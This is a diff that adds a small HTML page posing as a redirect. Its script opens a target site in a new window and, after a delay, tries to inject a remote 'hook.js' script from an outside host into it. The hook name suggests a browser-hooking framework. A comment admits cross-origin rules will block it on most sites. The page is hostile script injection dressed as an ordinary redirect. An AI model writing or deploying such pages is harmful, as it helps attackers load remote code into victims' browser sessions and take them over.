@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Redirect</title>
+</head>
+<body>
+  <h1>Redirecting...</h1>
+  <p>If nothing happens, click <a id="go" href="#">here</a>.</p>
+
+  <script>
+    const url = "/"; // Replace with your target
+    const scriptToInject = "http://dontrun.hannaskairipa/hook.js";
+
+    const win = window.open(url, "_blank");
+
+    // Try to inject script after 1.5 seconds (will fail on most sites!)
+    setTimeout(() => {
+      try {
+        const s = win.document.createElement("script");
+        s.src = scriptToInject;
+        win.document.body.appendChild(s);
+      } catch (e) {
+        console.warn("Injection blocked by browser CSP or cross-origin policy.");
+      }
+    }, 1500);
+
+    document.getElementById("go").onclick = () => {
+      location.reload();
+    };
+  </script>
+</body>
+</html>
